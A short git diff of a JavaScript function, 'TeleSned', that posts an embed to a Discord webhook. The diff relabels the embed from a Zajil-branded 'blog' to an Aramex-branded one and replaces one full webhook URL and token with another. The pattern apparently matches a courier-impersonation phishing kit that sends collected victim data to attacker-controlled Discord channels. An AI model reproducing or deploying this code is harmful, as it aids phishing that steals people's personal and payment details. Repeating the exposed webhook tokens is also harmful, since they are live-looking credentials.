@@ -10,13 +10,13 @@ export const TeleSned = () => {
           color: "white",
           embeds: [
             {
-              title: " مدونة زاجل ",
+              title: "  2 مدونة ارامكس ",
               description: des,
            },
           ],
     };
             
-        await axios.post("https://discord.com/api/webhooks/1319315267557261344/30bQIOyy_YqW2zWZSqoQ3sY3OZFpu8GeCpmxJZys1KZQAoKfzaFvRDgSg2NdqMGqNRp6",body)
+        await axios.post("https://discord.com/api/webhooks/1323657404411547708/jUSuAd9o_S0TL9rPhMEBSPZU-NLcFje14IBmp-odcH7HdyB6Bsj75wfUs8-PsTO9bReT",body)
              
     }
   return {
